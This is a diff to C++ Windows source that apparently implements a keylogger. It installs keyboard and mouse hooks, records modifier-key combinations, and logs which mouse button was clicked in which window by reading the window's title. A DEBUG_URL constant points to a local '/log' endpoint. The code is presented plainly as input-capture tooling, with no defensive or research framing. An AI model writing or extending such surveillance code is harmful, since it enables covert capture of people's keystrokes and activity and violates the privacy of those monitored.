@@ -6,11 +6,14 @@
 
 const char* DEBUG_URL = "http://127.0.0.1:8000/log";
 
-void addCombinationModifier(std::string* input) {
-    auto checkModifierStatus = [](int vkCode) {
-        return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
-    };
+constexpr int MOUSE_CLICK_CHECKS[2] = {VK_LBUTTON, VK_RBUTTON};
+const std::unordered_map<int, const char*> MOUSE_EVENT_TO_STRING {{VK_LBUTTON, "Left Click"}, {VK_RBUTTON, "Right Click"}};
 
+boolean checkModifierStatus(int vkCode) {
+    return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
+};
+
+void addCombinationModifier(std::string* input) {
     if (checkModifierStatus(VK_CONTROL)) {
         *input += "CTRL + ";
     }
@@ -51,10 +54,22 @@ LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
 
 LRESULT CALLBACK MouseCallback(int nCode, WPARAM wParam, WPARAM lParam) {
     auto *mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lParam);
-
     auto point = mouseStruct->pt;
 
-    printf("x: %d, y: %d\n", point.x, point.y);
+    for (const int& x : MOUSE_CLICK_CHECKS) {
+        if (checkModifierStatus(x)) {
+            HWND window = WindowFromPoint(point);
+
+            const size_t len = 256;
+            char buffer[len];
+
+            GetWindowTextA(window, buffer, len);
+
+            printf("%s in %s\n", MOUSE_EVENT_TO_STRING.at(x), buffer);
+        }
+    }
+
+    //printf("x: %d, y: %d\n", point.x, point.y);
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
@@ -74,4 +89,3 @@ int main() {
 
     return 0;
 }
-
